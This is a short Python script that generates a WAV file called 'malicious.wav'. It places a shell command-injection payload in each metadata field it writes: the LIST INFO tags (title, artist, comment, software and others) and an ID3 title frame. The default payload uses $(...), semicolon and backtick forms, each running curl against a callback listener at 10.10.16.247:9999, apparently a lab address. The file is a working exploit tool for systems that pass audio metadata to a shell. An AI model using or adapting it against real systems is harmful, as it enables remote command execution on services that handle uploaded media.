import struct

def build_riff_chunk(chunk_id, data):
    # Ensure chunk length is even (RIFF spec requires padding byte if odd)
    if len(data) % 2 != 0:
        data += b'\x00'
    return chunk_id.encode('ascii') + struct.pack('<I', len(data)) + data

def generate_malicious_wav(payload_str):
    payload_bytes = payload_str.encode('utf-8') + b'\x00'
    
    # 1. fmt chunk (PCM 16-bit 44100Hz mono)
    fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
    fmt_chunk = build_riff_chunk('fmt ', fmt_data)
    
    # 2. data chunk (0.1 sec silence = 4410 samples * 2 bytes = 8820 bytes)
    audio_data = b'\x00' * 8820
    data_chunk = build_riff_chunk('data', audio_data)
    
    # 3. LIST INFO chunk with sub-chunks containing payload
    sub_chunks = b''
    for sub_id in ['INAM', 'IART', 'ICMT', 'ISFT', 'IGNR', 'ICOP', 'IKEY']:
        sub_chunks += build_riff_chunk(sub_id, payload_bytes)
    
    list_info_chunk = build_riff_chunk('LIST', b'INFO' + sub_chunks)
    
    # 4. ID3 chunk with ID3v2.3 tag
    # Simple ID3v2.3 header + TIT2 frame
    tit2_frame = build_riff_chunk('TIT2', b'\x00' + payload_bytes)
    id3_body = tit2_frame
    id3_header = b'ID3\x03\x00\x00' + struct.pack('>I', len(id3_body)) # simplified size
    id3_chunk = build_riff_chunk('id3 ', id3_header + id3_body)
    
    # Combine WAVE payload
    wave_payload = b'WAVE' + fmt_chunk + data_chunk + list_info_chunk + id3_chunk
    
    # Combine RIFF
    riff_file = build_riff_chunk('RIFF', wave_payload)
    return riff_file

if __name__ == '__main__':
    payload = '$(curl http://10.10.16.247:9999/wav_payload_hit); curl http://10.10.16.247:9999/wav_payload_hit2 ; `curl http://10.10.16.247:9999/wav_payload_hit3`'
    wav_bytes = generate_malicious_wav(payload)
    with open('malicious.wav', 'wb') as f:
        f.write(wav_bytes)
    print(f"Generated malicious.wav ({len(wav_bytes)} bytes)")
